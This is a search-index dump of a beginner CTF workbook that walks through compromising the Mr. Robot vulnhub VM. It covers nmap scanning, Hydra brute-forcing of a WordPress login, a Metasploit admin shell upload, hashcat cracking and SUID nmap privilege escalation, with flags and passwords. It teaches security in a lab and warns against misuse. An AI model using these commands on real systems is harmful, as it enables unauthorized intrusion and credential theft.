{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Security Capture The Flag CTF 101 Welcome to the Security CTF 101 worklab, sponsored by Amazon Web Services Security. In this worklab, you will work through a CTF challenge. This worklab is built on the Mr. Robot CTF/Alternative Reality Game hosted at vulnhub. Mr. Robot is a television show about a hacker- and the CTF is themed based on exploits the hacker ran in the Television program. This CTF was created by Leon Johnson. You can download the VM associated with this CTF here . Level : Beginner Duration : 2 hours Prerequisites : Environment Setup The challenge has 3 keys that we want to obtain. The keys are strings of text in files you have to discover. If you have questions, ask a mentor and we\u2019ll gladly help. If you have questions about what a CTF is, see the Appendix. Can I use what I learn here on other systems? This CTF includes real-world hacking techniques. DO NOT USE THESE TECHNIQUES ON SYSTEMS THAT YOU DO NOT CONTROL . You have permission to do this in our environment. If you used any of these techniques at your school or against other systems on the internet, against friends/family/acquaintances, you could get into serious trouble. When in doubt, only work on building your skills against a computer you own control. Getting Started This lab consists of two Virtual Machines (VMs). Virtual machines are instances of an operating system that can be ran within a host operating system. You can think of them as \u201cvirtual computers.\u201d One of the virtual machines is the target of our Capture The Flag 101 session. It is called \u201cMrRobot\u201d, and it appears to be running some version of Linux, which is an open source operating system. What is an operating system? An operating system controls the basic functions of a computer. It is the underlying environment that launches applications, controls hardware input/output operations and performs process scheduling. There are multiple Operating Systems you probably have heard of, including: Windows OSx (MacOS) iOS (for iphones) Android (for android devices) Linux and more! The second VM is our reconnaissance system. We will spend virtually all of our time in this system during the CTF. It is running an operating system based on Linux called \u201cKali.\u201d Kali is loaded with penetration testing tools that we can use to quickly assess if a system has security vulnerabilities. First, open up the MrRobot virtual machine. You\u2019ll see some ascii art that says Mr Robot and a login prompt labeled \u201cLinux Login:\u201d We have no other background on this system. If we want to get our first key, we need to find it on this system. Our immediate goal is to figure out how to get on the system in order to start finding keys. It would be great if we could identify the username and password for logging into the system. Take a moment to think about how you might do this. It\u2019s ok if you have no idea- but still think about different approaches for finding the username password for the system. There are two primary approaches to identifying the username password for the system: Guess the Username Password Scan the system for services that give us clues on how to gain access to the username password. Approach 1: Password Guessing Do you know any linux user account names? You could try guessing a password for a known login. It is surprising how often this approach will work. If you\u2019d like, you can try guessing a password- but if you want to save time, skip to the section called \u201cApproach 2: Scanning\u201d . Password guessing is unlikely to work for this lab. If you do want to try guessing- you could try common login/password combinations. There is an account on every linux system called \u201c root \u201d that is the most powerful user on the system. Do you know any others? Splash data ( https://www.splashdata.com/ ) publishes an annual report of the 100 worst passwords. This list is built from lists of commonly reused passwords that have been published on the Internet. You could try the loginname root with any of the following from the top 10 list to see if the password is guessable iloveyou qwerty sunshine 1234567 111111 12345 12345678 123456789 password 123456 If you didn\u2019t guess the correct password, then we need to try a different approach. It would be helpful if we had more context about the system. What if there are security tools that we can use to identify the system\u2019s IP address? Maybe it has network services running that would expose other clues! Approach 2: Scanning All computers on networks have IP addresses. You use the IP address to specify where you want a network connection to attach to. What\u2019s an IP address? IP stands for \u201cInternet Protocol.\u201d All computers connected to the Internet have an IP address. IPv4 addresses look like a \u201cdotted quad\u201d: 10.13.13.102 . They have sections with numbers between 0 and 255, separated by a period. An IP address is like your house\u2019s street address- if you want to send mail to a house, you need to put the source address of the sender in the top left corner of the envelope, the destination address in the middle of the front of your envelope. The mail carrier uses this information to route your packages to the destinations you intend. IP addresses the Domain Name System are used to ensure that your reuqests to a page like amazon.com are correctly routed, along with the responses from the server. You can learn more about IP addresses, DNS the internet here: https://www.youtube.com/watch?v=5o8CwafCxnU Identify the IP Range Let\u2019s switch over to our Kali VM. (You may need to hit the right-ctrl key to leave the Mr. Robot VM). The Kali VM looks like the following: Login under the root. The password is toor. Open a terminal window. Type in the command: ip addr show eth0 Note that the inet address. It should look like 10.13.13.101/24 (Your IP might be slightly different- it could end with the number 102 or 103. That\u2019s ok). The first part (10.13.13.101) is your kali linux system\u2019s IP address. The second part (/24) tells you the subnet range. This means that the subnet is 10.13.13, and the host address is .101. We want to find the ip address of the MrRobot server- so we\u2019re going to scan the 10.13.13.0/24 subnet range to get a list of all hosts that are listening. Can I scan systems on the internet? You should never scan any systems on the internet without permission . Additionally, you need to make sure that the person who gives you permission is authorized to give you permission. Do not scan computers at school, do not scan your friend\u2019s home networks. It can be perceived as a hacking attempt and could get you into trouble. Only scan systems that you are in control of and responsible for. In this lab- we\u2019re giving you permission to scan these systems. nmap -n 10.13.13.0/24 At the end of the scan, we see that 3 hosts are up. If you look in the report for the line \u201cnmap scan report\u201d, you\u2019ll see that there are 3 IP addresses that were identified: 10.13.13.100 10.13.13.101 10.13.13.102 We found our Kali system\u2019s ip at 10.13.13.101- but we also found two additional servers in our scan one at 100 and one at 102. (Your scan may have different IP addresses- you need to pay close attention to the results. You will need to write down the exact IP address found in your scan, and use it through the rest of this tutorial . When other commands specify an IP address, you\u2019ll need to use the one you wrote down for the commands in the rest of this workbook.) The 102. address has 3 services running, so we\u2019ll focus there because it seems like it has the most opportunity for inspection. What\u2019s a service? Servers are a computers that provide a network facing service that other computers can interact with. Services are computer programs that listen for and process network connections from other computers. Every time you visit a web page, your phone or computer are connecting to a type of service called a \u201cweb server\u201d, which makes a decision on whether or not to accept your request then deliver the correct content back to your client. There are other types of services as well- sshd allows people to remotely log into the system over an encrypted connection. SMTP servers are used for storing, sending receiving email. Your computer can run services that other people can connect to (e.g. if you host a minecraft game on your local network, you are temporarily running a server. If you use a minecraft realm, instead of running the server locally- you\u2019re running the server on a system somewhere out on the internet. Services are interesting for hackers- they present a possible entry point, if someone made mistakes configuring the server, or if the server has exploitable mistakes in it\u2019s code. Finding the first key One is an ssh service on port 22, one is an http service on port 80 and one is an https service on port 443. Let\u2019s try viewing the web page in a browser. Remember the IP address. Enter in the address of the server that had the listening services in a web browser. You can open a web browser by clicking here: You\u2019ll see a page that looks like a text terminal with a mr. robot login and a chat that says \u201cHello friend...\u201d There are several commands you can enter. The page looks a lot like it\u2019s \u201cMr Robot\u201d related! We must have found the right ip address for the Mr Robot server. ( Note: Many of the web page commands won\u2019t work- we disabled some of the content for this challenge ). Now we need to start thinking about how to solve this challenge. Remember our goal- we\u2019re trying to find some clues that would help us identify a way to log into the system. Somewhere on this web page are clues that will help us figure out the next step. Play with the page and see if you can solve it. If you are stuck, move to the next section for a spoiler: Spoiler: While the page is interesting, it\u2019s mostly fun looking marketing material for the tv show Mr. Robot. Viewing the page source won\u2019t yield much in terms of clues. But hidden in the pages is some material that will help you solve the challenge. Close the browser and go back to the linux terminal. Our nmap output told us there is a web server running on port 80 and port 443. Let\u2019s use an nmap NSE script to further spider the web site for more information: nmap -n -p 80 --script http-enum 10.13.13.102 (note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier! Also- make sure that you\u2019re not entering this command in the browser- if you see a command not found message, you probably are in the browser. Close the browser for now! :) ) This command will walk through the web app and try to report back any interesting files it finds. It takes about two minutes to complete. You should check out the files it offers you in a web browser, by adding the content to the existing ip address. E.g.: http://10.13.13.102/readme.html (note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) Spoiler One of the files the http-enum script highlights is the robots.txt file. Most web pages on the Internet have a file called \u201crobots.txt.\u201d If you want to keep a page from being spidered by a search engine, you can use this file to tell web crawlers to ignore your page\u2019s content. This \u201cMr Robot\u201d page seems to be something that someone would likely want to keep off the search engine. It\u2019s also interesting that there\u2019s a collision between the show\u2019s name this file- so let\u2019s take a look at it. In the browser\u2019s address field, let\u2019s look at the following url: 10.13.13.102/robots.txt (note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) What\u2019s robots.txt?? robots.txt files are used to tell web search engines and web spiders some rules for crawling indexing a page. They are an important component that contributes to the ranking of a page for a particular piece of content in a search engine like google. They can also be used to tell the search engine to please ignore content on the server- if for example, you wanted to keep your web page from showing up in google. In the robots.txt file, we see 3 lines: user-agent: * fsocity.dic key-1-of-3.txt A \u201cuser-agent\u201d is software that acts on behalf of a user- such as a web browser. We see the *, which is a wildcard operator. It means that this file is intended for all software connecting to the page. The next two lines are completely non-standard for a robots.txt file. It appears to be telling you about additional files on the web server. Something called fsocity.dic and key-1-of-3.txt. If we add key-1-of-3.txt to the url after the ip address (replace robots.txt)- we end up with the following page: You found the first CTF key! Congratulations! CTFs will often have obvious indicators like this to tell you you have solved the clue. This is a major achievement! This would be a good stopping point if you need to take a break. But if you\u2019d like to continue to working on the second key, continue reading! Finding the second key If we were running a jeopardy style ctf board, you\u2019d upload the key you just found to the server. But this is just a tutorial- so we\u2019ll just focus on finding and reading the remaining keys. You still have a problem: how do we log into a shell on the mr. robot system and find the remaining keys? Inspecting the robots.txt entries Maybe the fsocity.dic entry in the robots.txt file is related. What should we do? Maybe this fsocity.dic is another file on the web server Let\u2019s browse to it and see if we find anything: We found a file! Let\u2019s open it: The file seems to be a word list. It\u2019s pretty hard to parse. But there\u2019s a clue in the extension name: \u201c.dic\u201d seems like shorthand for dictionary. There are username password dictionaries that hackers can use to compromise a system. Our original goal was to find a username password combination we could use to login to the Mr.Robot shell- maybe we can use this file to perform a dictionary attack? Reload this file in the browser. Instead of opening it, click on save and accept the default location by clicking \"ok\". (this location will be /tmp/mozilla_root0). We\u2019ll need that file later. This won\u2019t work well- if you use the wordcount command on the file, you\u2019ll find that it has over 858 thousand lines in it. We\u2019re probably not ready to use this file yet. Let\u2019s try to get some more information about our target system. Let\u2019s find out more about the web server by trying to trigger an error page and look at it\u2019s output. There probably is not a file on the webserver named asdf.txt- so let\u2019s browse to it and see what the error page says: Exploring the web server for useful information Enter 10.13.13.102/asdf.txt in the address field. ( note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) notice this error page: At the bottom, the page says \u201cProudly hosted by Wordpress.\u201d Wordpress is a popular blogging platform that has a long history of vulnerabilities. Maybe we can find some wordpress specific vulnerabilities to exploit? Let\u2019s take a note of that fact and move on. Another possibility is to try clicking on the \u201clog in\u201d link (under \u201cMETA\u201d) and trying some accounts. Exploring login errors for useful information Lets\u2019 try a username of asdf and a password of asdf and see what the error says: The error is instructive! it says \u201cError: Invalid username\u201d. Obviously, asdf is not a valid user. But what if we guessed a username that is likely to be on the system? Maybe we\u2019ll get a better answer. The Mr. Robot tv show has a main character named elliot. Maybe that is a valid account on the system? Let\u2019s try username \u201celliot\u201d and password \u201casdf\u201c This time, the error is different: When we put asdf in the username field- we were told that the username was invalid. When we put in elliot, we\u2019re told we have the wrong password. There must be a valid user named elliot! Now we just need to guess elliot\u2019s password. De-duping the password dictionary file That .dic file is obviously left there for us to use. Let\u2019s leverage the .dic file for passwords. Since it\u2019s so large- and many of the entries are duplicates- let\u2019s try de-duplicating the file: Open a new terminal, and type: cd /tmp/mozilla_root0 sort /tmp/mozilla_root0/fsocity.dic | uniq -u fsocity_deduped.dic if we use wc -l against the deduped file, we see it\u2019s only 10 unique lines! A much smaller set to work with: Now we\u2019re ready to use an automated tool to brute-force elliot\u2019s password. We\u2019re going to hope that the dictionary file includes an appropriate password. We\u2019ll use a tool called \u201chydra\u201d to brute force the password. You can watch the tool attempt to work with the ngrep command in a second terminal window: ngrep -W byline \u201cPOST\u201d port 80 Open a new terminal, and type: cd /tmp/mozilla_root0 Brute forcing the password of the user \u201cElliot\u201d Now- we\u2019re going to use a tool called \u201cHydra\u201d with the dictionary file we downloaded earlier. Hydra will use every line in the dictionary file as a password for the user account elliot. This saves us from manually trying every single line of our dictionary file. Type the following command ( note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) hydra -l \u201celliot\u201d -P fsocity_deduped.dic 10.13.13.102 http-post-form \u201c/wp-login.php:log=^USER^ pwd=^PASS^ wp-submit=Log+In:F=is incorrect\u201d (If you see an error saying File for passwords not found, make sure to run the sort command from the previous page. If the command completes and it indicates that all logins worked, it suggests you had a typo on the http-post-form target value. Please review it for typos.) In the ngrep output of the other terminal, you can see the log pwd lines that were included above. Note that for every request, the log value is the same (elliot) but the password changes- it\u2019s one of the 10 entries in the dictionary file. After a few moments, hydra will finish running. If everything worked correctly, you should have the credential: So now, if we go back into the wp login and submit the username of elliot password of ER28-0652 , we should be able to login: Success! Although it\u2019s pretty boring at this point. There\u2019s not much in the wp-admin page that\u2019s of use. We still need to get extensive access to the system. Fortunately- we\u2019ve gotten far enough along that we should be able to succeed. Remember before when we mentioned that wordpress has a long history of vulnerabilities? We\u2019re going to use our knowledge of elliot\u2019s wordpress username password to gain access to the system and find the next key. Using Wordpress Credentials to get a shell on a vulnerable wordpress instance There is an exploitation framework called metasploit which includes large numbers of methods for compromising systems. Open up a terminal and type msfconsole: msfconsole Next, we\u2019ll load a wordpress adminshell exploit: use exploit/unix/webapp/wp_admin_shell_upload you can learn more about the exploit by using the info command: exploit(unix/webapp/wp_Admin_shell_upload) info We see that if we provide valid admin credentials, we\u2019ll be able get a payload onto a server that will allow us to have a shell on the system. Let\u2019s set it up: We need to set our username, password, the IP address of the target system and we need to set a WPCHECK variable to false to address a small bug. After those 4 sets are completed, if we have the right values included, we can type \u201cexploit\u201d to start the attack: If you entered in the correct values and everything was properly online, you should see a screen like the following: Let\u2019s make it easy to parse shell command output by using a special python command to spawn a shell: ** python - c import pty; pty.spawn( /bin/sh ) ** You can now easily enter in commands. You can use \u201cwhoami\u201d to see the name of the account you\u2019re currently logged into. whoami This tells us that the account name we\u2019re running under is named \u201cdaemon\u201d What\u2019s a user account? Computers typically have many different types of accounts. Some accounts have more permissions than others- while other accounts have restrictions in place that limit their functionality. Some special accounts exist (like ftp, www, nobody, root, daemon) that are used for special purposes. The daemon account is used by the webserver we just gained shell access through- so we are now able to run commands access systems that the daemon account has access to. You can use the command pwd to see the directory you\u2019re currently in: pwd It looks like we\u2019re in a long directory tree that hosts wordpress pages. Now that you\u2019ve gained access to a unix system- it\u2019s sometimes helpful to look around in the /home/ directory to figure out what our next step should be. Let\u2019s search what\u2019s in the home directory: cd /home/ And now let\u2019s list the files in that directory: ls -alh There is a directory called \u201crobot\u201d- which sounds related to our CTF. let\u2019s look inside it: You found the second CTF key! BUT THERE\u2019S A PROBLEM... Key 2 of 3 found! Unfortunately, we cannot open it because we don\u2019t have read permissions for it. We\u2019re in the daemon user, but the key is only readable by the robot user. Try to cat it and you\u2019ll get the following error: cat key-2-of-3.txt We\u2019re the currently running commands under the account named \u201cdaemon\u201d- the key is readable only by the user robot. It looks like we need to look at this md5 file to get a password that will give us access to the robot account. Let\u2019s try viewing it\u2019s contents with the more command: The file contents are: robot : c3fcd3fd76192e4007dfb496cca67e13b We know that there\u2019s an account called robot. This file includes a line with robot, and a long string which looks similar to a hash. The filename tells us it\u2019s a raw-md5 document, so perhaps this long string is the hash of a password. What\u2019s a hash? A hash is a mathematical function that should take an input value (let\u2019s say a), and generate exactly one unique output for that input value. It\u2019s kind of like a person\u2019s fingerprint. A fingerprint is not the person, but in theory, it could only be generated by the person who has the finger that generates that fingerprint. Often times, secrets are \u201cstored\u201d using a hashing function. This reduces the risk that someone can directly steal a password if they gain access to a system. Modern computing and aging hashing algorithms have made it possible to quickly determine the password for a given hash. We will use a tool called hashcat to try and find the password that generates the md5 hash \u201cc3fcd3fd76192e4007dfb496cca67e13b\u201d Cracking a password hash for the robot user account Open a terminal on your local Kali linux instance. We\u2019re going to make a file that has this hash: Type in the following command: echo \u201cc3fcd3fd76192e4007dfb496cca67e13b\u201d password.md5 This will create a file called password.md5, which stores the hash we found. We need a wordlist that with commonly used passwords that we can use to generate corresponding md5 values. Fortunately, kali has one in the /usr/share/wordlists/ directory. We\u2019ll use the rockyou.txt wordlist to try and find the password that generates our md5 hash. It will create a file called \u201ccracked.txt\u201d which stores the hash and the corresponding password. This command could take minutes or seconds, depending on the size of the word list and the computing power of your system: hashcat --force -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o cracked.txt Now let\u2019s look at our cracked.txt file. more cracked.txt This tells us that the password that generates the hash value c3fcd3d76192e4007dfb496cca67e13b is abcdefghijklmnopqrstuvwxyz . We did it! It looks like we found the password for the robot account! You can test this hash/password value by typing the following command to get the md5 value of the password: echo -n abcdefghijlkmnopqrstuvwxyz | md5sum Elevating to the robot user Now we just need to try and switch to the robot account. From our metasploit shell, let\u2019s type the following command: su robot You\u2019ll be prompted for a password. Type in abcdefghijlkmnopqrstuvwxyz If you typed it in correctly, you should see the following: Now you can view the contents of the key2-of-3.txt file: You finally can view the second CTF key! Our second key is 822c73956184f694993bede3eb39f95! Congratulations! Well done! If we were competing in a CTF, we\u2019d be uploading this value to the CTF page under our account. If you\u2019d like to take a break, this would be an excellent place to stop. Finding the third key 2 keys down- 1 to go. We need to find the 3rd key. It\u2019s probably named something like key-3-of-3.txt. Maybe we can use the find command to discover it\u2019s location? find / -name key-3-of-3.txt This isn\u2019t very productive. We have lots of permission denied errors: This is happening because the Robot user is not allowed to access the entire file system. We need to elevate our privileges to be able to see what is in various directories. We should try to get access to the root account so that we can search everywhere on the file system. Searching for SUID files that might be exploitable. One way to get root is to find a vulnerable binary on your file system that has the SUID bit set for a program that is owned by root. This next step requires a bit of background knowledge- but let\u2019s start out by searching for all files on the system with the setuid bit set: find / -perm -4000 2 /dev/null A bunch of interesting files come up - but one in particular catches my eye: the nmap comand has the setuid bit set. You may not know this- but there used to be a version of nmap that had an interactive terminal. If the nmap binary has the setuid bit set, and it\u2019s owned by root, we can use it to get root. Let\u2019s find out who owns it: It\u2019s owned by the root user! Let\u2019s call nmap using the interactive shell: /usr/local/bin/nmap --interactive Exploiting an old vulnerability in NMAP to escalate to root If we put a ! before a command, we\u2019ll be able to pass shell commands through nmap running under it\u2019s setuid command. Above, you can see the \u201cwhoami\u201d comand doesn\u2019t work if you skip the !, but it does work if you add it. Not only that, but despite the fact that you invoked the nmap binary under the robot account, you\u2019re now showing up as root. Let\u2019s use this trick to look inside the /root/ directory: We found key-3-of-3.txt! Let\u2019s use nmap and the cat command to read it\u2019s contents: ! cat /root/key-3-of-3.txt You found the final CTF key! We did it! we now have the 3rd key: 04787ddef27c3dee1ee161b21670b4e4. If we had a CTF board running, this is the key value we\u2019d upload. There you go! You have finished the lab. Let\u2019s review what we learned: We learned about scanning a network to discover systems their ip addresses using nmap We found a server, and then learned how to discover network services running on the system, also using nmap. We learned how to spider a web page and discovered a robots.txt file on web servers (which also happened to be our first key!) We discovered an admin login page , and used the error messages that the login page provided and discovered valid user accounts (\u201celliot\u201d) on the system. We used a tool called Hydra and discovered elliot\u2019s password . We used metasploit and discovered vulnerabilities in the wordpress web server. We used metasploit and gained interactive shell access to the server . We used that interactive shell access to find the second key- but we couldn\u2019t access it due to a permissions setting. We cracked the password of the robot account using hashcat. We used our dicovered robot account password to view the second key. We found a setuid mistake that allowed us to use an nmap binary and escalated to the root account. We used our root privileges to find and read the 3rd key. There were multiple security mistakes that we exploited. 1. A password dictionary file was stored on the web server. Putting unnecessary files on a public web server is dangerous and should be avoided. 2. Wordpress disclosed too much information about a failed login. Error messages should not disclose information that would be useful for a hacker regarding what is happening in the web application. 3. The Wordpress version is out of date and has a known vulnerability that can be exploited to gain a shell on the service. Software should be patched and up to date to avoid exploitable security vulnerabilities. 4. The password hash used by the robot user was not salted and consequently, vulnerable to a dictionary attack. Passwords should be salted with instance specific secrets to reduce the effectiveness of a dictionary attack. 5. An out of date version of nmap had the SUID bit set for root, which enabled privilege escalation from the robot user. Software should be patched and up to date. The use of SUID for root should be generally avoided. More info on this particular mistake is available here: https://pentestlab.blog/2017/09/25/suid-executables/ Appendix What are CTFs? Computer Security experts practice their skills in competitions called \u201cCapture The Flag.\u201d During the course of r00tz asylum, the neverlanCTF folks are running a CTF competition. If you\u2019ve never competed in a CTF, it might seem intimidating- but don\u2019t worry. You absolutely have the skills to to try a CTF. It\u2019ll be intimidating as you start- but Everyone has to start somewhere. We\u2019re here to help. We\u2019re running a CTF 101 that will give you real world computer security experience. This guide will provide you with an overview of how a CTF works, and how to run through 3 real world CTF examples that are themed to align with some of the hacking events you might have seen in the TV Show \"Mr. Robot\u201d If you are nervous about competing in the CTF- our worklab will give you the confidence to succeed. Our examples are a little more challenging than those used in the CTF- but we give you nice guides to help you get unstuck. If you are interested in general computer security topics- our worklab will give you a real world example of finding extracting secrets from working linux workstations. Background: What is Capture the Flag? Capture the Flag a fun game where two teams each hide a colored flag that represents their team. The goal is to locate take the opposing team\u2019s flag and bring it back to their base. A typical CTF game might take 30-60 minutes and involve a lot of running around, hiding and playing \u201ctag\u201d to put opposing team members into jail. You get sweaty, you might get dirty. You may even get the flag and return it to your base. This is very different than a Security CTF. What is a Security CTF? In Security CTFs, we don\u2019t run around and steal flages. We generally don\u2019t get sweaty outrunning our opposition. We chase after greater adventure: We solve puzzles. Our puzzles are about searching for secret keys in operating systems or in files. Security CTFs come in two general types: Jeopardy Attack-defense. Here at r00tz, neverlan is running a Jeopardy style CTF. You\u2019ll be presented with multiple challenges worth varying amounts of points. Typically, you will be a part of a team (although you can work alone if you prefer) and all of your teammate's points will count to the final team score. The goal is for your team to have the most points at the end of the game. You get points by finding \u201cKeys\u201d and submitting them to the scoring app for the competition. A key will look similar to. (but never exactly the same) as the following: Challenges are typically presented in the style of a Jeopardy Scoreboard- where there might be 6 columns, with each column representing a specific category of security challenges. In a given row, the value of the challenge will increase based on the complexity/difficulty of the challenge. You can decide which topic you think you might know the most about and then select an individual challenge. The lower value challenges are likely to be easier, and the higher value challenges are likely to be harder. The surprising thing about CTFs is that you probably know more than you realize. Sometimes the higher value challenges turn out to be easy because you just happen to know the right details. The important things to remember are: Use a search engine to research the details of a challenge (e.g. google, bing, duckduckgo, etc.) If you don\u2019t know something, you may find answers on the Internet. Try new challenges! Don\u2019t be afraid to walk away from one that you don\u2019t understand. There\u2019s always a couple of challenges that you\u2019ll be able to solve. Take breaks! Don\u2019t be afraid to take a break from challenges if you\u2019re struggling. Sometimes you just need to step away from the problem- and suddenly the answers will become clear. Talk to your teammates. Sometimes, describing the problem you\u2019re having will help you identify a key detail you overlooked. Sometimes, you\u2019ll have a special insight that will help your teammate solve a problem. Security CTF Workflow Register your team. You will normally be given a url for a web page where you can submit your challenge answers under your team\u2019s account. Select a challenge. Review the puzzle. Collect the appropriate assets to work on the challenge (log into a vm, download a file, etc.) Identify what the target of the challenge is (the puzzle should give you some description of what your objective is. Typically, you\u2019re asked to retrieve a \u201ckey\u201d from a file/server/etc.) Post your key to the CTF web page under your team\u2019s account. If you submit the wrong key, the CTF web page will normally tell you that it\u2019s the wrong value and won\u2019t award points. If you submit the right key, you\u2019ll get the points for your team. Keep solving challenges till the competition is over. Sometimes competitions give you a bonus for being the first team to solve a challenge- but don\u2019t worry if someone else solves it before you. You still can get points. CTF strategies: First- decide if you want to work alone, or form a team. Tip : You should form/join a team! You\u2019ll learn things from other players. You\u2019ll likely teach other players things they didn\u2019t know. You\u2019ll find that a team will collect points faster than you can as a sole contributor. Don\u2019t be afraid to ask existing teams if they need someone to join them. Solve challenges based on categories you\u2019re comfortable with You can choose whatever problem you would like to work on out of all of the challenges based on the value of the challenge. You can also choose to work on a problem based on the category of the problem- you might be really comfortable looking at files, or capturing network packets- and so you may choose to work on problems based on their category. Solve challenges based on score values Are you feeling extra confident? Go for the higher score challenges. Are you feeling lucky? Go for the higher score challenges? Are you feeling nervous? Go for the lower score challenges. Don\u2019t be afraid to try categories you don\u2019t think you know. You might be surprised to discover you know more than you expect. List of Linux commands we used: ls (used to list information about files and directories within the file system.) cd (used to change the current directory) pwd ( pwd prints the name of the present/current working directory (PWD - Present Working Directory) find (utility for walking a file hierarchy. It can be used to find files and directories and perform subsequent operations on them) ip (used to assign an address to a network interface and/or configure network interface parameters on Linux operating systems. ) nmap (tool used for scanning network hosts for discovering what services the hosts are running) cat (command used to create single or multiple files, view contain of file , concatenate files and redirect output in terminal or files) more (similar to cat . more is used to view the text files in the command prompt, displaying one screen at a time in case the file is large) whoami (used to discover the user account the shell is currently running under). echo (used to display line of text/string that are passed as an argument . This is a built in command that is mostly used in shell scripts and batch files to output status text to the screen or a file.) hashcat (used to crack passwords from various hashing formats) sort (Used to sort text files)","title":"Security Capture the Flag (CTF)"},{"location":"#security-capture-the-flag-ctf-101","text":"Welcome to the Security CTF 101 worklab, sponsored by Amazon Web Services Security. In this worklab, you will work through a CTF challenge. This worklab is built on the Mr. Robot CTF/Alternative Reality Game hosted at vulnhub. Mr. Robot is a television show about a hacker- and the CTF is themed based on exploits the hacker ran in the Television program. This CTF was created by Leon Johnson. You can download the VM associated with this CTF here . Level : Beginner Duration : 2 hours Prerequisites : Environment Setup The challenge has 3 keys that we want to obtain. The keys are strings of text in files you have to discover. If you have questions, ask a mentor and we\u2019ll gladly help. If you have questions about what a CTF is, see the Appendix. Can I use what I learn here on other systems? This CTF includes real-world hacking techniques. DO NOT USE THESE TECHNIQUES ON SYSTEMS THAT YOU DO NOT CONTROL . You have permission to do this in our environment. If you used any of these techniques at your school or against other systems on the internet, against friends/family/acquaintances, you could get into serious trouble. When in doubt, only work on building your skills against a computer you own control.","title":"Security Capture The Flag CTF 101"},{"location":"#getting-started","text":"This lab consists of two Virtual Machines (VMs). Virtual machines are instances of an operating system that can be ran within a host operating system. You can think of them as \u201cvirtual computers.\u201d One of the virtual machines is the target of our Capture The Flag 101 session. It is called \u201cMrRobot\u201d, and it appears to be running some version of Linux, which is an open source operating system. What is an operating system? An operating system controls the basic functions of a computer. It is the underlying environment that launches applications, controls hardware input/output operations and performs process scheduling. There are multiple Operating Systems you probably have heard of, including: Windows OSx (MacOS) iOS (for iphones) Android (for android devices) Linux and more! The second VM is our reconnaissance system. We will spend virtually all of our time in this system during the CTF. It is running an operating system based on Linux called \u201cKali.\u201d Kali is loaded with penetration testing tools that we can use to quickly assess if a system has security vulnerabilities. First, open up the MrRobot virtual machine. You\u2019ll see some ascii art that says Mr Robot and a login prompt labeled \u201cLinux Login:\u201d We have no other background on this system. If we want to get our first key, we need to find it on this system. Our immediate goal is to figure out how to get on the system in order to start finding keys. It would be great if we could identify the username and password for logging into the system. Take a moment to think about how you might do this. It\u2019s ok if you have no idea- but still think about different approaches for finding the username password for the system. There are two primary approaches to identifying the username password for the system: Guess the Username Password Scan the system for services that give us clues on how to gain access to the username password.","title":"Getting Started"},{"location":"#approach-1-password-guessing","text":"Do you know any linux user account names? You could try guessing a password for a known login. It is surprising how often this approach will work. If you\u2019d like, you can try guessing a password- but if you want to save time, skip to the section called \u201cApproach 2: Scanning\u201d . Password guessing is unlikely to work for this lab. If you do want to try guessing- you could try common login/password combinations. There is an account on every linux system called \u201c root \u201d that is the most powerful user on the system. Do you know any others? Splash data ( https://www.splashdata.com/ ) publishes an annual report of the 100 worst passwords. This list is built from lists of commonly reused passwords that have been published on the Internet. You could try the loginname root with any of the following from the top 10 list to see if the password is guessable iloveyou qwerty sunshine 1234567 111111 12345 12345678 123456789 password 123456 If you didn\u2019t guess the correct password, then we need to try a different approach. It would be helpful if we had more context about the system. What if there are security tools that we can use to identify the system\u2019s IP address? Maybe it has network services running that would expose other clues!","title":"Approach 1: Password Guessing"},{"location":"#approach-2-scanning","text":"All computers on networks have IP addresses. You use the IP address to specify where you want a network connection to attach to. What\u2019s an IP address? IP stands for \u201cInternet Protocol.\u201d All computers connected to the Internet have an IP address. IPv4 addresses look like a \u201cdotted quad\u201d: 10.13.13.102 . They have sections with numbers between 0 and 255, separated by a period. An IP address is like your house\u2019s street address- if you want to send mail to a house, you need to put the source address of the sender in the top left corner of the envelope, the destination address in the middle of the front of your envelope. The mail carrier uses this information to route your packages to the destinations you intend. IP addresses the Domain Name System are used to ensure that your reuqests to a page like amazon.com are correctly routed, along with the responses from the server. You can learn more about IP addresses, DNS the internet here: https://www.youtube.com/watch?v=5o8CwafCxnU Identify the IP Range Let\u2019s switch over to our Kali VM. (You may need to hit the right-ctrl key to leave the Mr. Robot VM). The Kali VM looks like the following: Login under the root. The password is toor. Open a terminal window. Type in the command: ip addr show eth0 Note that the inet address. It should look like 10.13.13.101/24 (Your IP might be slightly different- it could end with the number 102 or 103. That\u2019s ok). The first part (10.13.13.101) is your kali linux system\u2019s IP address. The second part (/24) tells you the subnet range. This means that the subnet is 10.13.13, and the host address is .101. We want to find the ip address of the MrRobot server- so we\u2019re going to scan the 10.13.13.0/24 subnet range to get a list of all hosts that are listening. Can I scan systems on the internet? You should never scan any systems on the internet without permission . Additionally, you need to make sure that the person who gives you permission is authorized to give you permission. Do not scan computers at school, do not scan your friend\u2019s home networks. It can be perceived as a hacking attempt and could get you into trouble. Only scan systems that you are in control of and responsible for. In this lab- we\u2019re giving you permission to scan these systems. nmap -n 10.13.13.0/24 At the end of the scan, we see that 3 hosts are up. If you look in the report for the line \u201cnmap scan report\u201d, you\u2019ll see that there are 3 IP addresses that were identified: 10.13.13.100 10.13.13.101 10.13.13.102 We found our Kali system\u2019s ip at 10.13.13.101- but we also found two additional servers in our scan one at 100 and one at 102. (Your scan may have different IP addresses- you need to pay close attention to the results. You will need to write down the exact IP address found in your scan, and use it through the rest of this tutorial . When other commands specify an IP address, you\u2019ll need to use the one you wrote down for the commands in the rest of this workbook.) The 102. address has 3 services running, so we\u2019ll focus there because it seems like it has the most opportunity for inspection. What\u2019s a service? Servers are a computers that provide a network facing service that other computers can interact with. Services are computer programs that listen for and process network connections from other computers. Every time you visit a web page, your phone or computer are connecting to a type of service called a \u201cweb server\u201d, which makes a decision on whether or not to accept your request then deliver the correct content back to your client. There are other types of services as well- sshd allows people to remotely log into the system over an encrypted connection. SMTP servers are used for storing, sending receiving email. Your computer can run services that other people can connect to (e.g. if you host a minecraft game on your local network, you are temporarily running a server. If you use a minecraft realm, instead of running the server locally- you\u2019re running the server on a system somewhere out on the internet. Services are interesting for hackers- they present a possible entry point, if someone made mistakes configuring the server, or if the server has exploitable 